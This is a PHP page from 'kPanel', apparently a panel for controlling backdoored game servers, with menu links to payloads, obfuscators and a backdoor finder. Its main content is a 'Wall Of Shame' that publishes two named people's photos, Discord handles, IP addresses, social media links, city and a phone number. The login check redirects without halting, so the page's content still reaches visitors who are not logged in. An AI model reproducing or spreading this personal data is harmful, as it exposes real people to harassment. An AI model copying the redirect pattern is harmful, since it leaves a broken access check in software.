<?php

include 'core/class/include.php';

// Redirige l'utilisateur si il n'est pas authentifier
if (!Account::isAuthentified())
{
    header('Location: ./login');
}

?>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>kPanel | Wall Of Shame</title>
    <!-- plugins:css -->
    <link rel="stylesheet" href="assets/vendors/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="assets/vendors/css/vendor.bundle.base.css">
    <!-- endinject -->
    <!-- Plugin css for this page -->
    <link rel="stylesheet" href="assets/vendors/jvectormap/jquery-jvectormap.css">
    <link rel="stylesheet" href="assets/vendors/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.carousel.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.theme.default.min.css">
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <!-- endinject -->
    <!-- Layout styles -->
    <link rel="stylesheet" href="assets/css/style.css">
    <!-- End layout styles -->
    <link rel="shortcut icon" href="https://kpanel.cz/home/assets/img/logo/kpanel.png" />
  </head>
  <body>
    <div class="container-scroller">
      <!-- partial:partials/_sidebar.html -->
      <nav class="sidebar sidebar-offcanvas" id="sidebar">
        <ul class="nav">
          <li class="nav-item profile">
            <div class="profile-desc">
              <div class="profile-pic">
                <div class="count-indicator">
                  <img class="img-xs rounded-circle " src="<?php echo Account::GetPP(); ?>" alt="">
                  <span class="count bg-success"></span>
                </div>
                <div class="profile-name">
                  <h5 class="mb-0 font-weight-normal"><?php echo Account::GetUsername(); ?></h5>
                  <?php
                  $hisrole = Account::GetRole();
                  $rolecolor = Account::GetRoleColor();
                  $rolecolorlink = Account::GetRoleColorFire();
                  if ($hisrole == "Administrateur") {
                    $role = "<span style='color: #000000; font-weight: bold; text-shadow: 0 0 5px ".$rolecolor.", 0 0 5px ".$rolecolor."; background: url(".$rolecolorlink.") repeat scroll 0% 0% transparent;}'>Administrateur</span>";
                  }
                  else {
                    $role = "<span>Utilisateur</span>";
                  }
                  ?>
                  <?php echo $role; ?>
                </div>
              </div>
              <a href="#" id="profile-dropdown" data-toggle="dropdown"><i class="mdi mdi-dots-vertical"></i></a>
              <div class="dropdown-menu dropdown-menu-right sidebar-dropdown preview-list" aria-labelledby="profile-dropdown">
                <a href="./profile" class="dropdown-item preview-item">
                  <div class="preview-thumbnail">
                    <div class="preview-icon bg-dark rounded-circle">
                      <i class="mdi mdi-settings text-primary"></i>
                    </div>
                  </div>
                  <div class="preview-item-content">
                    <p class="preview-subject ellipsis mb-1 text-small">Profil</p>
                  </div>
                </a>
              </div>
            </div>
          </li>
          <li class="nav-item nav-category">
            <span class="nav-link">Gestion</span>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="dashboard">
              <span class="menu-icon">
                <i class="mdi mdi-speedometer"></i>
              </span>
              <span class="menu-title">Dashboard</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="servers">
              <span class="menu-icon">
                <i class="mdi mdi-server"></i>
              </span>
              <span class="menu-title">Serveurs</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="history">
              <span class="menu-icon">
                <i class="mdi mdi-wechat"></i>
              </span>
              <span class="menu-title">Historique</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="payloads">
              <span class="menu-icon">
                <i class="mdi mdi-code-tags"></i>
              </span>
              <span class="menu-title">Payloads</span>
            </a>
          </li>
          <li class="nav-item nav-category">
            <span class="nav-link">Outils</span>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="chat">
              <span class="menu-icon">
                <i class="mdi mdi-wechat"></i>
              </span>
              <span class="menu-title">Chat</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="obfu">
              <span class="menu-icon">
                <i class="mdi mdi-barcode"></i>
              </span>
              <span class="menu-title">Obfuscateurs</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="bdfinder">
              <span class="menu-icon">
                <i class="mdi mdi-code-array"></i>
              </span>
              <span class="menu-title">Backdoor Finder</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="smartlua">
              <span class="menu-icon">
                <i class="mdi mdi-wheelchair-accessibility"></i>
              </span>
              <span class="menu-title">Smart lua<div class="badge badge-info badge-xs">Beta</div></span>
            </a>
          </li>
          <li class="nav-item nav-category">
            <span class="nav-link">Autres</span>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="rules">
              <span class="menu-icon">
                <i class="mdi mdi-clipboard-text"></i>
              </span>
              <span class="menu-title">Règles</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="wallofshame">
              <span class="menu-icon">
                <i class="mdi mdi-gavel"></i>
              </span>
              <span class="menu-title" style="color: #000000; font-weight: bold; text-shadow: 0 0 5px #800080, 0 0 5px #800080; background: url(/imgs/fire_purple.gif) repeat scroll -5% 0% transparent;">Wall Of Shame</span>
            </a>
          </li>
          <?php if (Account::IsAdmin()) { ?>
            <li class="nav-item nav-category">
              <span class="nav-link">Administration</span>
            </li>
            <li class="nav-item menu-items">
              <a class="nav-link" href="users">
                <span class="menu-icon">
                  <i class="mdi mdi-account-circle"></i>
                </span>
                <span class="menu-title">Utilisateurs</span>
              </a>
            </li>
            <li class="nav-item menu-items">
              <a class="nav-link" href="allservers">
                <span class="menu-icon">
                  <i class="mdi mdi-server"></i>
                </span>
                <span class="menu-title">Tous les serveurs</span>
              </a>
            </li>
            <li class="nav-item menu-items">
              <a class="nav-link" href="logs">
                <span class="menu-icon">
                  <i class="mdi mdi-settings"></i>
                </span>
                <span class="menu-title">Logs</span>
              </a>
            </li>
          <?php } ?>

        </ul>
      </nav>
      <!-- partial -->
      <div class="container-fluid page-body-wrapper">
        <!-- partial:partials/_navbar.html -->
        <nav class="navbar p-0 fixed-top d-flex flex-row">
          <div class="navbar-brand-wrapper d-flex d-lg-none align-items-center justify-content-center">
            <a class="navbar-brand brand-logo-mini" href="index.html"><img src="assets/images/logo-mini.svg" alt="logo" /></a>
          </div>
          <div class="navbar-menu-wrapper flex-grow d-flex align-items-stretch">
            <button class="navbar-toggler navbar-toggler align-self-center" type="button" data-toggle="minimize">
              <span class="mdi mdi-menu"></span>
            </button>
            <ul class="navbar-nav navbar-nav-right">
              <li class="nav-item dropdown">
                <a class="nav-link" id="profileDropdown" href="#" data-toggle="dropdown">
                  <div class="navbar-profile">
                    <img class="img-xs rounded-circle" src="<?php echo Account::GetPP();?>" alt="">
                    <p class="mb-0 d-none d-sm-block navbar-profile-name"><?php echo Account::GetUsername();?></p>
                    <i class="mdi mdi-menu-down d-none d-sm-block"></i>
                  </div>
                </a>
                <div class="dropdown-menu dropdown-menu-right navbar-dropdown preview-list" aria-labelledby="profileDropdown">
                  <h6 class="p-3 mb-0">Profil</h6>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item preview-item" href="./profile">
                    <div class="preview-thumbnail">
                      <div class="preview-icon bg-dark rounded-circle">
                        <i class="mdi mdi-settings text-success"></i>
                      </div>
                    </div>
                    <div class="preview-item-content">
                      <p class="preview-subject mb-1">Profil</p>
                    </div>
                  </a>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item preview-item" href="./logout">
                    <div class="preview-thumbnail">
                      <div class="preview-icon bg-dark rounded-circle">
                        <i class="mdi mdi-logout text-danger"></i>
                      </div>
                    </div>
                    <div class="preview-item-content">
                      <p class="preview-subject mb-1">Déconnection</p>
                    </div>
                  </a>
                </div>
              </li>
            </ul>
            <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
              <span class="mdi mdi-format-line-spacing"></span>
            </button>
          </div>
        </nav>
        <!-- partial -->
        <div class="main-panel">
          <div class="content-wrapper">
            <?php if(empty($_GET['id'])) { ?>
            <div class="row">
              <div class="col-lg-6 grid-margin stretch-card">
                <div class="card">
                  <div class="card-body"><div class="chartjs-size-monitor"><div class="chartjs-size-monitor-expand"><div class=""></div></div><div class="chartjs-size-monitor-shrink"><div class=""></div></div></div>
                    <h4 class="card-title">Baptiste Besson</h4>
                    <center><img src="https://image.noelshack.com/fichiers/2019/46/7/1574007130-screenshot-2019-11-17-17-08-55-2.png" width="150">
                    <br><br>
                    <a href="?id=1" class="btn btn-success btn-lg">Voir</a></center>
                  </div>
                </div>
              </div>
              <div class="col-lg-6 grid-margin stretch-card">
                <div class="card">
                  <div class="card-body"><div class="chartjs-size-monitor"><div class="chartjs-size-monitor-expand"><div class=""></div></div><div class="chartjs-size-monitor-shrink"><div class=""></div></div></div>
                    <h4 class="card-title">Thomas Dormiski</h4>
                    <center><img src="https://i.imgur.com/ZW0I1JF.jpg" width="150">
                    <br><br>
                    <a href="?id=2" class="btn btn-success btn-lg">Voir</a></center>
                  </div>
                </div>
              </div>
            </div>
          <?php } else if ($_GET['id'] == "1") { ?>
            <div class="row">
              <div class="col-12 grid-margin">
                <div class="card">
                  <div class="card-body"><div class="chartjs-size-monitor"><div class="chartjs-size-monitor-expand"><div class=""></div></div><div class="chartjs-size-monitor-shrink"><div class=""></div></div></div>
                    <h4 class="card-title">Baptiste Besson</h4>
                    <center>
                      <img src="https://image.noelshack.com/fichiers/2019/46/7/1574007130-screenshot-2019-11-17-17-08-55-2.png" width="150">
                      <h2>Baptiste Besson</h2>
                      <br><br>
                      <strong>Discord :</strong><br>
                      El Baptisto [Baptisto 001 YTB]#5920<br><br>
                      <strong>IP:</strong><br>
                			- 81.67.206.220<br>
                			- 51.255.235.102:27340<br><br>
                      <strong>Pseudo :</strong><br>
                      - Baptisto 001<br>
                      - El Baptisto [Baptisto 001 YTB]<br><br>
                      <strong>Chaîne youtube :</strong><br>
                      <a href="https://www.youtube.com/channel/UC1Zol3EdMsiwKn-keRiW3nQ">https://www.youtube.com/channel/UC1Zol3EdMsiwKn-keRiW3nQ</a><br><br>
                      <strong>Site :</strong><br>
                      <a href="https://baptiste07snoopy.wixsite.com/monsite">https://baptiste07snoopy.wixsite.com/monsite</a><br><br>
                      <strong>Prénom / Nom :</strong><br>
                      Baptiste Besson<br><br>
                      <strong>Pays :</strong><br>
                      France<br><br>
                      <strong>Ville :</strong><br>
                      Lorraine (?)<br><br>
                      <strong>Téléphone :</strong><br>
                      07 69 13 02 83
                    </center>
                  </div>
                </div>
              </div>
            </div>
          <?php } else if ($_GET['id'] == "2") { ?>
            <div class="row">
              <div class="col-12 grid-margin">
                <div class="card">
                  <div class="card-body"><div class="chartjs-size-monitor"><div class="chartjs-size-monitor-expand"><div class=""></div></div><div class="chartjs-size-monitor-shrink"><div class=""></div></div></div>
                    <h4 class="card-title">Thomas Dormiski</h4>
                                        <center>
                    <img src="https://i.imgur.com/ZW0I1JF.jpg" width="150">
                    <h2>Thomas Dormiski</h2>
                    <br><br>
                    <strong>Discord :</strong><br>
                  TrackZone#7837<br><br>
                  <strong>Pseudo :</strong><br>
                  - TrackZone<br><br>
                  <strong>Chaîne youtube :</strong><br>
                  <a href="https://www.youtube.com/channel/UCaTJ2pTBTIWb00TKXewdPxg">https://www.youtube.com/channel/UCaTJ2pTBTIWb00TKXewdPxg</a><br>
                  <a href="https://www.youtube.com/channel/UCLZYFtFGR56NFENIr9NN6Ow">https://www.youtube.com/channel/UCLZYFtFGR56NFENIr9NN6Ow</a><br><br>
                  <strong>Site :</strong><br>
                  <a href="https://baptiste07snoopy.wixsite.com/monsite">https://baptiste07snoopy.wixsite.com/monsite</a><br><br>
                  <strong>Facebook :</strong><br>
            			<a href="https://www.facebook.com/thomas.domirski/timeline?lst=100002292688180%3A100006760750246%3A1560086562">https://www.facebook.com/thomas.domirski/timeline?lst=100002292688180%3A100006760750246%3A1560086562</a><br><br>
            			<strong>Prénom / Nom :</strong><br>
            			Thomas Dormiski<br><br>
            			<strong>Pays :</strong><br>
            			France<br><br>
            			<strong>Ville :</strong><br>
            			Carvin<br><br>
                    </center>
                  </div>
                </div>
              </div>
            </div>
          <?php } ?>
            </div>
          </div>
          <!-- content-wrapper ends -->
          <!-- partial:partials/_footer.html -->
          <footer class="footer">
            <div class="d-sm-flex justify-content-center justify-content-sm-between">
              <span class="text-muted text-center text-sm-left d-block d-sm-inline-block">Copyright © 2020 <a href="#" target="_blank">kPanel</a>. All rights reserved.</span>
            </div>
          </footer>
          <!-- partial -->
        </div>
        <!-- main-panel ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
    <!-- container-scroller -->
    <!-- plugins:js -->
    <script src="assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <script src="assets/vendors/chart.js/Chart.min.js"></script>
    <script src="assets/vendors/progressbar.js/progressbar.min.js"></script>
    <script src="assets/vendors/jvectormap/jquery-jvectormap.min.js"></script>
    <script src="assets/vendors/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
    <script src="assets/vendors/owl-carousel-2/owl.carousel.min.js"></script>
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="assets/js/off-canvas.js"></script>
    <script src="assets/js/hoverable-collapse.js"></script>
    <script src="assets/js/misc.js"></script>
    <script src="assets/js/settings.js"></script>
    <script src="assets/js/todolist.js"></script>
    <!-- endinject -->
    <!-- Custom js for this page -->
    <script src="assets/js/dashboard.js"></script>
    <!-- End custom js for this page -->
  </body>
</html>
